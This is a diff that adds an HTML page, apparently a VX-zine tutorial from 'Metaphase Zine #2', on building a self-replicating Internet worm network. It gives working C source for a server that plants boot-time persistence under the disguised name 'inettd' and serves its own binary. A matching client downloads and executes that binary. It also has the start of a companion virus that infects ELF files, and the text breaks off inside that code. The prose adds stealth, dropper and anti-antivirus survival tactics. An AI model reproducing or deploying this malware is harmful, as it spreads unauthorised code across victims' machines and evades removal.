@@ -1,0 +1,1114 @@
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - Replicating Entity ( iWORM-NET )</TITLE>
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+<P align="center"> <font color="#004080"><b><font size="+3">Replicating Entity 
+  ( iWORM-NET )</font><br>
+  <font size="+1">by Paul Zest a.k.a. PZest</font></b><br>
+  -|- <br>
+  <a href="mailto:pzest@coderz.net">pzest@coderz.net</a> </font></P>
+<P align="center"><font color="#004080" size="-1"><b>[source: Metaphase Zine #2 
+  + author]</b></font></P>
+<hr>
+<P> <b><font size="+1" color="#004080">Abstract </font></b></P>
+<P>
+This paper is based upon the idea of a replicating entity mechanism referred to as the 
+Internet worm or an iWORM.  The concept of the worm is well known nowadays and 
+gathering momentum in popularity as the Internet becomes more ubiquitous. 
+</P><P>
+Many worm entities use high level scripting exploits over communication system 
+programs. These systems include IRC and email (such as MS Outlook). These system 
+usually expect some direct interaction from the user, i.e. to run the infection agent 
+unwittingly, by opening and running a script. The scripts will then automatically take 
+control, search through the mail address list and then mail itself on to the next 
+unsuspecting victim. 
+</P><P>
+A lower level exploit for iWORM's is to use the operating system level 'socket 
+interface'. The socket interface is an abstract communication layer that can use the 
+TCP/IP infrastructure and allows client / server applications to be built.  The iWORM-
+NET is the linking up of these server programs to become a larger iWORM network, with 
+the capabilities to update itself through the connection of established links.
+</P>
+<P> <b><font size="+1" color="#004080">Introduction </font></b></P>
+<P> The work presented here is incomplete and is more of a presentation of ideas. 
+  I started writing this as Knowdeth made the last call for contributions for 
+  <a href="ezines1.htm#META">Metaphase Zine #2</a> so I am writing and this in 
+  order to make the publication deadline. Spelling mistakes and typos are bound 
+  to be rife in this document and that's a shame, but there you go. The project 
+  shall be developed beyond this early start. </P>
+<P>
+ The idea of a client / server iWORM has been floating around in my head for quite 
+sometime and after reading some basic literature on socket programming I decided to see 
+how this useful architecture could be exploited for the use of a replicating entity.
+</P><P>
+I usually think of a client / server application as the little program (client) and the big 
+program (server). The server is the 'established' machine with lots of functionality and 
+the client is the little remote portal into the server hosts facilities. The client / server 
+paradigm can be used inside a single standalone machine but it's more usual usage is in 
+networked systems. The networked systems can be local area network (LAN) or a wide 
+area network (WAN). The Internet is a sort of WAN and this is an ideal substrate for a 
+WORM to travel around in. The Internet uses TCP/IP among other protocols such as 
+UDP/IP.  TCP/IP is a connection oriented system (i.e. virtual link between machines is 
+maintained) and UDP/IP is connection less system, using datagrams.  UDP is lower level 
+than TCP and requires a bit more program intervention i.e. the assembly and ordering of 
+IP packets however it's a more efficient system without the TCP overheads. TCP is a 
+popular protocol in (I)networking and has established itself as the standard. So this article 
+will deal with TCP rather than UDP but I recommend UDP as the way to go for 
+iWORMs'.
+</P><P>
+When I use the word 'established' machine I mean to say that the iWORM is a fully 
+functioning entity looking for it next victim. The client WORM VX is a subset of the 
+server WORM. There is a clue in that last line as to the setup of this iWORM-NET, the 
+client WORM VX is the infection agent, sent out to seek new victims and the server 
+WORM is the network control/command centre.
+</P><P>
+The client WORM VX consists of two basic functional parts, a virus and a socket client. 
+The server WORM consists of a socket server, a client WORM VX generator, a control 
+(nerve) centre and functions to ensure survivability. The server side of the iWORM-NET 
+is responsible for knowing the state of the victim host machine, maintenance of the link 
+infrastructure i.e. the WORM network, upgrading itself through the network, assisting the 
+spread of more iWORMs' and overall stealth strategies.
+</P>
+<P> <b><font size="+1" color="#004080">The iWORM-NET </font></b></P>
+<P> A picture can say a thousand words and a few diagrams can probably say more 
+  than that, so lets start with diagram 1. </P>
+<P align="center"><img src="diagram1.gif" width="512" height="384"></P>
+<P align="center"> <b>Diagram 1. </b></P>
+<P>
+The server WORM is represented as a larger entity inside the host machine. The client 
+WORM VX are shown as the smaller circles 1,2,3,A,B,C  . The first three clients W-Vx 
+are floating around inside the host system and these could be attached to host files or 
+exist as File WORMS (Companion Virus), etc. etc.  The other three W-Vx exist outside 
+the host machine. W-Vx (B) is an entity that hasn't found a system yet i.e. it could be in 
+transit as an email attachment or on a floppy diskette. W-Vx (A) shown with a thin line 
+connected to the server WORM has just established a connection to the server and is 
+negotiating communications with the server. 
+</P>
+<P> The W-Vx (C) is the most significant stage is the client/server relationship. 
+  The link is established and the client WORM VX is sucking a copy of the server 
+  WORM over to the victim machine. See Diagram 2. to see the next stage in this 
+  process. </P>
+<P align="center"><img src="diagram2.gif" width="512" height="384"></P>
+<P align="center"> <b>Diagram 2.</b> </P>
+<P>
+The new copy of the server WORM is installed on the victim machine and control is now 
+handed over to the new server WORM as the task of W-Vx ( C ) is completed.
+</P>
+<P> <b>W-Vx Genocide </b></P>
+<P> The next task for the new server WORM is to kill off all the W-Vx on the new 
+  victim/host machine, as these are the progeny of the other server WORM and carry 
+  the 'old' information in there structure. This older information includes an 
+  IP data list with available server WORMs. The reason for killing off the W-Vx 
+  is to allow the new server to start its task of analysing the new host machine. 
+  After a period of analysis the new server WORM is read to start generating it's 
+  own W-Vx offspring with its information seed. It may not actually be necessary 
+  to actually kill off the old W-Vx but to just update its internal data. One 
+  reason for not killing off the W-Vx on the new host machine is because the new 
+  server WORM may not have the capability of generating new client WORM VX i.e. 
+  one of it's sub systems may be damaged or missing, see server WORM section for 
+  more information. </P>
+<P align="center"><img src="diagram3.gif" width="512" height="384"></P>
+<P align="center"> <b>Diagram 3. </b></P>
+<P> <b>W-Vx / server WORM lifecycle </b></P>
+<P>
+In the typical lifecycle of the relationship between these two entities the following things 
+could happen. The server will be actively killing off W-Vx entities inside it's own host. 
+In the first instance before the server WORM is installed on the host machine the W-Vx 
+would have found there way into the victim host and are in active phase of spreading and 
+reproducing, whilst trying to establish a connection with the WORM net. When the 
+server WORM takes control of the host machine the activity of the W-Vx is put to an 
+end.
+</P><P>
+There may still be inactive W-Vx floating around i.e. on the users floppy diskettes, inside 
+email attachments (unread email), inside archive files (zip's, tar's, gz's) etc. etc.  If or 
+when these W-Vx get activated they will be killed off immediately by the server WORM. 
+Another scenario however is where the user introduces a W-Vx from another source i.e. 
+an infection from a different server WORM to the original infection and the W-Vx are 
+different. The server will still kill these new invaders but will extract the IP information 
+contained within them. This new information would possibly add extra vitality to the 
+server WORMs genotype.
+</P>
+<P> <b>server WORM </b></P>
+<P> OK now we discuss the function of the server WORM and it's role in the scheme 
+  of things. As you can probably imagine the server is the major player in the 
+  iWORM-NET. The server appears to be very much larger than the client and the 
+  reasons for this is the much larger operational tasks such a system would need 
+  to have in order to be successful. In fact the server shouldn't be a single 
+  entity but a collection of sub-systems that are interconnected with interprocess 
+  communications ( pipes or UNIX sockets AF_UNIX ). </P>
+<P align="center"><img src="diagram4.gif" width="512" height="384"> </P>
+<P align="center"> <b>Diagram 4. </b></P>
+<P>
+Sub-systems of the WORM allow the system to be transmitted to the victim host in 
+stages. There are several reasons why this could be advantageous, namely stealth and 
+upgradability. Stealth in a system basically means survivability and the aim of the game 
+is to survive, as this is one of the fundamental prerequisites to eLIFE. If the new server 
+WORM is to maintain it's ability to go unnoticed in a host machine then it must plan a 
+strategy for importing itself in sections rather than one huge download, which would 
+probably alert some users to something suspicious. This strategy would allow for the 
+server sub systems to download in chunks, starting with the most important modules.
+</P><P>
+If the server connection were cut/severed without uploading the full server WORM, the 
+partial server WORM would still be able to operate in a partially functioning form. One 
+of these important functions would be to search for other server from it's known list of 
+operational WORM nets. Upon connection to a different server it could upload the 
+missing sub systems and get back to the task in hand, namely replicating and maintaining 
+the iWORM-NET. 
+</P><P>
+Analysis of connections to the Internet is an absolute must. There are two main types of 
+connection to the Internet, fixed and temporary. Fixed type connections are usually the 
+domain of Government, Academic institutions, Businesses and users with a need for 
+permanent connection. Temporary connections to the Internet usually fall into the domain 
+of casual users, home users etc. and their provider of this Internet connection is via a 
+telephone communications provider and an ISP (Internet Service Provider). The fixed 
+connection user is usually connected to the Internet through a LAN connection, which 
+feeds onto their router or gateway, and connections are usually on a fixed or sticky IP 
+address. The temporary user may have one or more ISP provider and are allocated a 
+dynamic IP address upon connection over a point to point protocol (PPP). 
+
+</P>
+<P> A really big problem for the server WORM is a permanent connection with a 
+  known IP address. Refer to Diagram 5 for an appreciation of this problem. </P>
+<P align="center"><img src="diagram5.gif" width="512" height="384"></P>
+<P align="center"> <b>Diagram 5. </b></P>
+<P>
+The different case demonstrates some of the problems that can be encountered, over a 
+24hr period. 
+</P>
+<P> <b>Case 1: </b></P>
+<ul>
+  <li> In this situation the communication link is up for the full duration of 
+    the 24hr period machine (A) is the server and the machine (B) the client is 
+    able to connect to the server thus giving the system the maximum opportunity 
+    to transmit the server WORM over to the new host machine (B). </li>
+</ul>
+<P> <b>Case 2: </b></P>
+<ul>
+  <li> Machine (A) the server is connected to the Internet and is in waiting / 
+    listening mode. Machine (B) logs onto the Internet and then connects to the 
+    server WORM machine (A) however the 'window of opportunity' (W.O.O.) is cut 
+    short and the user on machine (A) logs off the Internet. In this case the 
+    new host machine may not have had sufficient time to download a complete server 
+    WORM system (remember the reason for sub systems). The machine (B) will have 
+    to try another server IP address or wait for machine (A) to log back in again. 
+  </li>
+</ul>
+<P> <b>Case 3: </b></P>
+<ul>
+  <li> In this scenario the machine (B) is already logged into the Internet and 
+    is waiting for a server WORM machine to log in. It must constantly poll the 
+    Internet to see if it can establish a link with a server. After some time 
+    machine (A) logs onto the Internet and the W.O.O. is available for a sufficient 
+    amount of time for the entire server WORM to be downloaded onto the victim 
+    host machine (B). </li>
+</ul>
+<P> <b>Case 4: </b></P>
+<ul>
+  <li> Unfortunately this is one of the worst case scenarios there is 'no window 
+    of opportunity' (N.W.O.O.). In this case both the machines are connected but 
+    not at the same time. </li>
+</ul>
+<P>
+ISPs for PPP dialup connection is one of the biggest problems for the iWORM-NET will 
+be connection to the network when a link is down. In terms of failure, the worst case 
+scenario for a client WORM VX is if the IP list provided is useless on the new host.
+</P>
+<P> <b>IP address lookup </b></P>
+<P>
+IP addresses are collected by the server WORM as the history of links is built up they are 
+passed onto the client WORM VX entities. The server WORM decided to create the W-
+Vx progeny and give the IP list of possible server WORMS to the W-Vx as a parting gift, 
+this will include its own address of course. In the lifetime of the server it will be 
+constantly monitoring the host machines connection to the Internet and saving the IP 
+addresses internally in it's data store. Using statistical analysis of the connections it will 
+determine the best IP connection addresses to pass onto the client WORM VX. The IP 
+links with the highest probability for success is the information that is passed onto the 
+next generation of iWORM entities.
+</P>
+<P> <b>iWORM-NET </b></P>
+<ul>
+  <li> Servers will connect together and exchange IP information. </li>
+  <li> Servers will be allowed to pass sub system modules around among themselves, 
+    thus automatically updating themselves. A sexual recombination of sub system 
+    components could lead to an evolutionary mechanism. Hence give rise to a possible 
+    Artificial Life form. eLIFE maybe. </li>
+  <li> server WORMs would actively seek other iWORM servers by persistantly trying 
+    IP addresses from the historical list of infected host machines and the information 
+    obtained from other server WORMs. This is analogous to the system have many 
+    tendrils constantly seeking pathways into the cyberspace. </li>
+</ul>
+<P> <b>server WORM 'spore' survival strategy </b></P>
+<P>
+So much effort has gone into maintaining the iWORM-NET structure that extra efforts to 
+sustain its existence would be required. The system described is analogous to biological 
+bacteria or fungal spore. The spore is a hardy survival mechanism that sleeps under harsh 
+environmental conditions awaiting a trigger mechanism, a reactivation signal. 
+</P><P>
+If the server were wiped out by accident or from some AV product, then the ability to 
+reinstall itself would be advantageous. An extra layer of protection could be built into the 
+system such as a separate dropper type entity. Unlike the usual dropper programs that are 
+created by individuals and distributed with the drop facility the dropper program would 
+be created dynamically by the server WORM. This dropper entity would remain inactive 
+throughout the server WORMs' lifetime. The dropper can take on many forms, a 
+standalone application  'runme-please' as an example (bit lame) or as a companion 
+replacement or maybe the classic file append type virus. How about all of the above. 
+</P><P>
+The dropper would lie in wait inactive until one day the user runs the command. The 
+dropper application does it's usually task before going back to sleep, namely to check for 
+the existence of the server WORM, only on this occasion the server WORM is missing 
+(deleted). The dropper will now reinstall the server WORM and then go back to sleep. It 
+would probably be in the droppers' interests not to drop the server WORM immediately 
+after the first execution but to have a random counter or some non-regular strategy. 
+</P><P>
+The advantage of dynamic creation of a dropper is that no one would know what it looks 
+like there isn't a standard program. The worm SERVER would have a template for 
+creating the dropper, but again because the server WORM analyses the host machine and 
+environment it can devise a suitable strategy for the dropper algorithms. 
+</P><P>
+Because extra lengths would be introduced for survival, the dropper had best be 
+implemented using the best stealth methods and concealment strategies. There are many 
+ideas that could be implemented for this but I favour total concealment. In the case of a 
+host file containing the control mechanism, what I recommend is inserting jump vectors 
+inside the body of the host program. Inserting vector offsets inside the body of an 
+application would require complete breakdown of the functionality of the application to 
+make sure you don't pick an instruction is inside an infinite while loop or something. An 
+opportunistic jump inside the program to some lesser-used function of the program would 
+be idea; (this would also enhance the sleeper function of the dropper). 
+</P>
+<P> Where would the dropper be located on disk, hmmm usually appended to the end 
+  of a file thus increasing the file length (think conceal). Well in most files 
+  the last sector is not usually completely full (file slack), Ahhh but the little 
+  bit at the end of a file won't be enough surely? It's true I don't think it 
+  would be but hey there's plenty of these file slack space around the entire 
+  system isn't there. Use them all, and use a linked list to chain them altogether. 
+  See Diagram 6. </P>
+<P align="center"><img src="diagram6.gif" width="512" height="384"></P>
+<P align="center"> <b>Diagram 6 </b></P>
+<P>
+Well there are of course problems assosiated with the use of multiple file slacks. Files are 
+being deleted all the time, so one file missing and the system would just fall over. There 
+are serveral solutions to this problem, use system files that unlikely to be moved or 
+change or use error correcting code. There are plenty of robust error correction 
+algorithms mainly used in communication systems, well a WORM net is a sort of 
+communications system, so lets borrow a few. 
+</P>
+<P> <b>IP list strategy </b></P>
+<P>
+The construction of an IP list is simple enough but that  isn't the whole story
+</P>
+<P> <font size="+1"><b><font color="#004080">Code and Experimentation </font></b></font></P>
+<P> <b>client / server experiment </b></P>
+<P>
+The code shown here is the early experimental snippets and is provided to demonstrate 
+some principles. The system is written in C++ (well C really, no classes or OOP yet). The 
+development platform is Linux and was compiled and tested under RedHat 5.1 
+distribution. I recommend that you setup two or more computers with an Ethernet 
+connection between them. Use 192.168.254.002 for machine ( A ) and 192.168.254.003 
+for machine ( B ).
+</P><P>
+Run these experiments as ROOT user.  Try as an ordinary user this also as this changes 
+the behaviour of the server. When copying files over from the compile machine to the 
+other machine you may have to modify the file permissions in order to run the application 
+for the first time.   Use  CHMOD +x  i.e. if copying the server app over to another 
+machine use  "chmod +x server"  or "chmod +x client"  this will set the execute flag in 
+the file permissions. You may notice some form of stealth in this application, its very 
+weak but happens to be one of them tricks played on people without familiarity of  *nix 
+OS systems namely there is a file called inettd very similar to 'inetd' would an ordinary 
+user pick up on that ? I doubt it. 
+</P><P>
+After the compile you will have the following files.  Compile instruction "g++ server.c -o 
+server" 
+</P>
+<PRE>
+&lt;   server       &gt;
+&lt;   client       &gt;
+&lt;   fileworm     &gt;
+</PRE>
+<P>
+Without the &lt; &gt; of course.  Run the 'server' application on machine ( A )  and run 'client' 
+on machine ( B ).  Run the "./server" first on machine ( A ) and check that it's running  
+i.e. check the process table using the   "ps -axl" command and look for the server process. 
+Now on the machine ( B )    "./client 192.168.254.002"  the quad dot notation is used to 
+specify the address of the server machine ( A ),  this wouldn't be here of course in a full 
+functioning system as the IP address would be in a lookup table.
+</P>
+<P> <b>Server code</b> <font color="#004080"><b>server.c</b><font size="+1"><b> 
+  </b></font></font></P>
+<blockquote>
+  <PRE>
+************************************** cut here **********************************
+// iWORM server
+
+#include &lt;sys/types.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;netdb.h&gt;
+#include "all_rw.h"
+#define  PORT_NO 0x800       
+#define IMBUFF_SZ 1024
+
+main()
+{
+
+   printf("Start of Prog\n");
+      
+
+   int server_sockfd, client_sockfd;
+   int server_len, client_len;
+   char* client_ip;
+   int client_port;
+   struct sockaddr_in server_address;
+   struct sockaddr_in client_address;
+   struct hostent* mylocalinfo;
+   struct hostent* clientinfo;
+   char* client_name;
+   char myname[256];
+   struct in_addr my_in_addr;
+   int image_fd;
+   int rc_fd;
+   int read_count;
+   char image_buffer[IMBUFF_SZ];
+   char rc_buf[IMBUFF_SZ+6];
+   char* found;
+   int rc_already = 0;
+   int euid;
+
+   char* bootfile;
+   char* servfile;
+   char workspace[32];
+   char workspace2[32];
+   char* needle;
+
+   euid = geteuid();
+   if(euid == 0)
+   {
+     needle = "inettd";
+     bootfile = "/etc/rc.d/rc.sysinit";
+     servfile = "/usr/sbin/inettd";
+   }
+   else
+   {
+     bootfile = workspace;
+     strcpy(bootfile, getenv("HOME"));
+     strcat(bootfile, "/.bash_profile");
+     if(access(bootfile, F_OK) != 0)
+     {
+       rc_fd = creat(bootfile,0x755);
+       close(rc_fd);
+       printf("created %s\n", bootfile);
+     }
+     needle = "usercn";
+     servfile = workspace2;
+     strcpy(servfile, getenv("HOME"));
+     strcat(servfile, "/usercntl");
+     
+   }
+   for(int i=0; i&lt;5; i++)
+     rc_buf[i] = ' ';
+   rc_buf[IMBUFF_SZ+5] = '\0';  
+   rc_fd = open(bootfile,O_RDONLY);
+   do
+   {
+      read_count = all_read_if_poss(rc_fd, &(rc_buf[5]), IMBUFF_SZ);
+      found = strstr(rc_buf, needle);
+      if(found != NULL)
+        rc_already++;
+   }
+   while(read_count &gt;0);
+   printf("rc_already=%d\n", rc_already);
+   close(rc_fd);
+   if(rc_already == 0)
+   {
+     rc_fd =  open(bootfile,O_WRONLY | O_APPEND);
+     if(euid == 0)
+       strcpy(rc_buf,"\n\n/usr/sbin/inettd &gt; /dev/null &\n");
+     else
+       strcpy(rc_buf,"\n\n./usercntl &gt; /dev/null &\n");
+     all_write_absolute(rc_fd, rc_buf, strlen(rc_buf) + 1);
+     close(rc_fd);
+   }
+      
+   gethostname(myname,255); // who am I ?
+   mylocalinfo = gethostbyname(myname);
+   
+   if(mylocalinfo == NULL)
+   {
+      printf("Trying to look up gethostbyname(%s)\n", myname);
+      herror("Error HOST");
+
+   }
+    
+   my_in_addr = *(struct in_addr*)(mylocalinfo-&gt;h_addr_list[0]);     
+
+   printf("my local name is %s\n", myname);	      
+   printf("my local address     IP is %s\n",inet_ntoa(my_in_addr));
+
+  
+
+
+   server_sockfd = socket(AF_INET,SOCK_STREAM,0);      
+   //
+   // socket entity that is the listening socket
+
+   server_address.sin_family = AF_INET;
+   server_address.sin_addr.s_addr = htonl(INADDR_ANY);
+   server_address.sin_port = htons(PORT_NO);
+   server_len = sizeof(server_address);
+
+   bind(server_sockfd,(struct sockaddr*)&server_address,server_len);       
+   //
+   // cast specific internet socket address point
+   // to a generic socket address pointer
+
+
+   listen(server_sockfd,5);
+
+
+   while(1)
+   {
+      char ch;
+      printf("server waiting\n");
+      client_sockfd = accept(server_sockfd,(struct sockaddr*)    
+      &client_address,&client_len);
+      client_ip = inet_ntoa(client_address.sin_addr);
+      clientinfo = gethostbyaddr((char*)& 
+      (client_address.sin_addr),4,AF_INET);
+      
+      if(clientinfo == NULL)
+      {
+        printf("Trying to look up gethostbyaddr\n");
+        herror("Error HOST");
+
+      }  
+
+      client_name = clientinfo-&gt;h_name;
+      client_port = ntohs(client_address.sin_port);
+      //
+      // ntohs   is net to host  short
+
+      printf("Connection from client %s named %s on port %d
+      \n",client_ip,client_name,client_port);
+      read(client_sockfd, &ch,1);
+      printf("Got request character %c\n", ch);
+
+      image_fd = open("/usr/sbin/inettd", O_RDONLY);
+      //
+      // now send image ...
+
+      if(image_fd &lt; 0) // fail?
+      {
+        image_fd = open(servfile, O_RDONLY);
+	  printf("Cannot open inettd\n");
+      }
+      else
+      {
+        printf("Opened inettd\n");
+      }
+      if(image_fd &lt; 0) // fail?
+      {
+        image_fd = open("server", O_RDONLY); // try local
+	printf("Cannot open %s\n", servfile);
+      }
+      if(image_fd &lt; 0) // fail?
+      {
+        image_fd = open("server", O_RDONLY); // try local
+	  printf("Cannot open any server at all :-(\n");
+	  continue;
+      }
+      do
+      {
+        read_count = all_read_if_poss(image_fd, image_buffer,   
+        IMBUFF_SZ);
+        all_write_absolute(client_sockfd, &read_count, 4);
+        //
+        // send count of block size
+	
+        printf("Block Size %d\n", read_count);
+        if(read_count)
+          all_write_absolute(client_sockfd, image_buffer,   
+          read_count);
+      } 
+      while(read_count&gt;0); // keep reading until end of file
+      close(image_fd);
+   
+
+      close(client_sockfd);
+   }
+
+}
+
+// compile:   g++ server.c -o server
+// run        ./server
+************************************** end cut here **********************************
+</PRE>
+</blockquote>
+<P>
+end of server code
+</P>
+<P> <b>client code <font color="#004080">client.c </font></b></P>
+<blockquote>
+  <PRE>
+************************************** cut here **********************************
+// iWORM client
+
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;netdb.h&gt;
+#include &lt;stdlib.h&gt;
+#include "all_rw.h"
+#define  PORT_NO 0x800
+#define IMBUFF_SZ 1024
+
+main(int argc, char** argv)
+{
+
+   printf("Start of Client\n");
+      
+
+   int sockfd;
+   int len;
+   struct sockaddr_in address;
+   char* host;
+   struct in_addr host_in_addr;
+   struct in_addr my_in_addr;     // i.e. the local clinet address
+   struct hostent* hostinfo;
+   struct hostent* mylocalinfo;
+   char myname[256];
+   int image_fd;
+   int read_count;
+   char image_buffer[IMBUFF_SZ];
+   int pid;
+      
+   int result;
+   char ch = 'A';
+   int uid;
+   int euid;
+   char* fname;
+   char userhome[32];
+   uid = getuid();
+   euid = geteuid();
+   if(euid != 0) // not root?
+   {
+     printf("Normal user u=%d e=%d\n", uid, euid);
+   }
+   else
+   {
+     printf("Root user u=%d e=%d\n", uid, euid);
+   }
+
+   if(access("/usr/sbin/inettd",X_OK) == 0)
+      // file exists
+   {
+     printf("Nothing to do\n");;
+     exit(0);
+   }   
+   
+
+
+      gethostname(myname,255);  // who am I ?
+      if(argc == 1)
+      {
+         host = myname;
+      }
+      else
+      {
+         host = argv[1];
+      }
+      printf("connection will be to %s\n\n",host);
+      hostinfo = gethostbyname(host);
+      host_in_addr = *(struct in_addr*)(hostinfo-&gt;h_addr_list[0]);
+      printf("connection to server IP is %s\n",inet_ntoa(host_in_addr));
+
+      mylocalinfo = gethostbyname(myname);
+
+      if(mylocalinfo == NULL)
+      {
+         printf("Trying to look up gethostbyname(%s)\n", myname);
+         herror("Error HOST");
+
+      }
+    
+     my_in_addr = *(struct in_addr*)(mylocalinfo-&gt;h_addr_list[0]);     
+   
+     printf("my local address     IP is %s\n",inet_ntoa(my_in_addr));
+
+
+     sockfd = socket(AF_INET,SOCK_STREAM,0);
+
+   
+     address.sin_family = AF_INET;
+     address.sin_addr = host_in_addr;
+     address.sin_port = htons(PORT_NO);
+     len = sizeof(address);
+
+     result = connect(sockfd,(struct sockaddr*)&address,len);
+     if(result == -1)
+     {
+        perror("Panic: client");
+        exit(1);
+     }
+
+     write(sockfd,&ch,1);
+     printf("Sent request character %c\n", ch);
+
+
+
+      if(euid == 0)
+        fname = "/usr/sbin/inettd";
+      else
+      {
+        strcpy(userhome, getenv("HOME"));
+	fname = userhome;
+        strcat(fname,"/usercntl");
+	printf("FNAME: %s\n", fname);
+      }
+   
+      image_fd = open(fname, O_CREAT | O_WRONLY | O_TRUNC, 0x644);
+      if(image_fd &lt;0)
+      {   
+	perror("Failed to create: ");
+	exit(1);
+      }
+      do
+      {
+         all_read_absolute(sockfd, &read_count, 4);
+	 printf("Expecting %d bytes from server ", read_count); fflush(stdout);
+         if(read_count)
+	 {
+	    all_read_absolute(sockfd, image_buffer, read_count);
+            printf("[Data transferred] "); fflush(stdout);  
+	    all_write_absolute(image_fd, image_buffer, read_count);
+            printf("[Data written]\n");
+	 }
+      }
+      while(read_count&gt;0); // keep reading until end of file
+      close(image_fd);
+      if(chmod(fname, 0x755) &lt;0)
+      {
+        printf("Fname %s\n", fname);
+	perror("chmod problem: ");
+
+      }
+      
+  
+      close(sockfd);
+      pid = fork();
+      switch(pid)
+      {
+        case -1:
+          printf("Fork failed\n");
+          exit(2);
+        case 0: // child
+          execl(fname,"-bash",NULL);
+	  perror("Exec failure: ");
+          printf("Exec failed\n");
+          exit(3);  
+        default:
+          exit(0);
+      }
+ 
+}
+
+
+// compile:   g++ client.c -o client
+// run        ./client
+************************************** end cut here **********************************
+</PRE>
+</blockquote>
+<P>
+end of client code
+</P>
+<P> <b>client support code <font color="#004080">all_rw.c </font></b></P>
+<blockquote>
+  <PRE>
+************************************** cut here **********************************
+#ifndef ALL_RW_H
+
+#define ALL_RW_H
+
+
+// Utility Wrappers for read() and write() to allow completion
+// of required size of transfer, in absence of EOF, or Absolutely
+
+int all_read_if_poss(int fd, void* vbuf, int size)
+{
+  char* buf;
+  int bytes_already_done;
+  int bytes_done_this_time;
+  buf = (char*)vbuf;
+  bytes_already_done = 0;
+  while(bytes_already_done &lt; size) // keep calling read until all bytes got
+  {
+     bytes_done_this_time = read(fd, buf + bytes_already_done, size -
+     bytes_already_done); // try to process anything remaining
+     //    
+     // ABOVE COULD BE WRITTEN AS:  bytes_done_this_time = read(fd, &(buf
+     // [bytes_already_done]), size - bytes_already_done); 
+     //
+     // try to process anything remaining
+
+     if(bytes_done_this_time &lt; 0) // ERROR?
+       return bytes_done_this_time;
+     if(bytes_done_this_time == 0) // Probable End of File
+       return bytes_already_done;
+     bytes_already_done += bytes_done_this_time;
+     //
+     // update count of what has been processed
+  }
+  return bytes_already_done; // which should equal size
+}
+
+int all_write_if_poss(int fd, void* vbuf, int size)
+{
+   char* buf;
+   int bytes_already_done;
+   int bytes_done_this_time;
+   buf = (char*)vbuf;
+   bytes_already_done = 0;
+   while(bytes_already_done &lt; size) // keep calling write until all bytes got
+   {
+      bytes_done_this_time = write(fd, buf + bytes_already_done, size -   
+      bytes_already_done); // try to process anything remaining
+      //    
+      // ABOVE COULD BE WRITTEN AS:  bytes_done_this_time = write(fd, &(buf  
+      // [bytes_already_done]), size - bytes_already_done); 
+      // try to process anything remaining
+    
+      if(bytes_done_this_time &lt; 0) // ERROR?
+         return bytes_done_this_time;
+      if(bytes_done_this_time == 0) // Probable End of File
+         return bytes_already_done;
+      bytes_already_done += bytes_done_this_time;
+      //
+      // update count of what has been processed
+   }
+   return bytes_already_done; // which should equal size
+}
+
+int all_read_absolute(int fd, void* vbuf, int size)
+{
+  char* buf;
+  int bytes_already_done;
+  int bytes_done_this_time;
+  buf = (char*)vbuf;
+  bytes_already_done = 0;
+  while(bytes_already_done &lt; size) // keep calling read until all bytes got
+  {
+     bytes_done_this_time = read(fd, buf + bytes_already_done, size -   
+     bytes_already_done); // try to process anything remaining
+     //
+     // ABOVE COULD BE WRITTEN AS:  bytes_done_this_time = read(fd, &(buf
+     // [bytes_already_done]), size - bytes_already_done);
+     // try to process anything remaining
+     
+     if(bytes_done_this_time &lt; 0) // ERROR?
+        return bytes_done_this_time;
+        bytes_already_done += bytes_done_this_time;
+        // 
+        // update count of what has been processed
+  }
+  return bytes_already_done; // which should equal size
+}
+
+int all_write_absolute(int fd, void* vbuf, int size)
+{
+  char* buf;
+  int bytes_already_done;
+  int bytes_done_this_time;
+  buf = (char*)vbuf;
+  bytes_already_done = 0;
+  while(bytes_already_done &lt; size) // keep calling write until all bytes got
+  {
+     bytes_done_this_time = write(fd, buf + bytes_already_done, size - 
+     bytes_already_done); 
+     // try to process anything remaining
+     // ABOVE COULD BE WRITTEN AS:  bytes_done_this_time = write(fd, &(buf //
+     // [bytes_already_done]), size - bytes_already_done); 
+     // try to process anything remaining
+  
+     if(bytes_done_this_time &lt; 0) // ERROR?
+        return bytes_done_this_time;
+     bytes_already_done += bytes_done_this_time;
+     // update count of what has been processed
+  }
+  return bytes_already_done; // which should equal size
+}
+
+#endif
+
+
+************************************** end cut here **********************************
+</PRE>
+</blockquote>
+<P>
+end of client support code
+</P>
+<P> <b>fileworm VX </b></P>
+<P>
+The "fileworm"  is just a noddy example of  a possible VX that would be used to 
+transport the client socket program around. The fileworm VX  can be modified to include 
+the client program and execute that code as and when. It maybe prudent to check if there 
+is already a client WORM VX already in operation. 
+</P><P>
+The fileworm program can be run from the /bin  /usr/bin  or /usr/sbin directories as there 
+are lots of ELF binaries here to check it's functionality. The files that have been exploited 
+will have (original) appended to the file name  i.e.  filename  becomes filename(original).   
+Run the clean up script to undo the infection process.
+</P>
+<P> <b>fileworm <font color="#004080">fileworm.c </font></b></P>
+<blockquote>
+  <PRE>
+************************************** cut here **********************************
+// fileworm VX or companion VX
+
+#include &lt;stdio.h&gt; 
+#include &lt;sys/types.h&gt; 
+#include &lt;sys/stat.h&gt; 
+#include &lt;dirent.h&gt; 
+#include &lt;unistd.h&gt; 
+#include &lt;errno.h&gt; 
+#include &lt;ctype.h&gt; 
+#include &lt;string.h&gt; 
+ 
+main(int ac, char** av, char** envp) 
+{ 
+   char* tailp; 
+   int namelen; 
+   int ch; 
+   char Myname[64]; 
+   char Myorgname[74]; 
+   DIR* dirp; 
+   struct dirent* dentp; 
+   char filename[64]; 
+   char orgfilename[74]; 
+   FILE* fp; 
+   int result; 
+   char command[80]; 
+   char buffer[8]; 
+   struct stat StatBuf1; 
+   struct stat StatBuf2; 
+ 
+   strcpy(Myname, av[0]); 
+ 
+   dirp = opendir("."); 
+   if(dirp == NULL) 
+      exit(0); 
+ 
+   while(1) 
+   { 
+      dentp = readdir(dirp); 
